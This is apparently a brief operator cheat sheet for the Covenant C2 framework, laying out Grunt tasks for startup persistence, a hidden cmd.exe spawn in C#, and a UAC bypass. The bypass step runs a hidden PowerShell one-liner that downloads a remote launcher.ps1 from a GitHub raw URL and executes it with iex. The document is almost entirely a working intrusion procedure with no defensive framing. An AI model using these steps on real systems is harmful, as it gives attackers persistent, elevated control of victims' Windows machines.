## Setup Persistance ([source](https://www.sevenlayers.com/index.php/370-covenant-c2-deep-dive))
- Visibility: none
- GruntTask: **PersistStartup**
- Payload: [here](https://raw.githubusercontent.com/sJ3Wpid/schoolproject/main/launcher.ps1)
- FileName: `student.bat`

## Get high integrity ([source](https://www.sevenlayers.com/index.php/370-covenant-c2-deep-dive))
### Step 1
- Visibility: none
- GruntTask: **SharpShell**
- Code:
```
var startInfo = new System.Diagnostics.ProcessStartInfo { FileName = @\"C:\Windows\System32\cmd.exe\", WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden }; var cmd = new System.Diagnostics.Process { StartInfo = startInfo }; cmd.Start(); return cmd.Id.ToString();
```
### Step 2
- Visibility: High (empty cmd window up to 2s)
- GruntTask: **BypassUACCommand**
- Command: `cmd.exe`
- Parameters: 
```
/c powershell -Sta -Nop -Window Hidden -Command iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/sJ3Wpid/schoolproject/main/launcher.ps1')
```
- Directory: none
- ProcessID: {output of step 1}
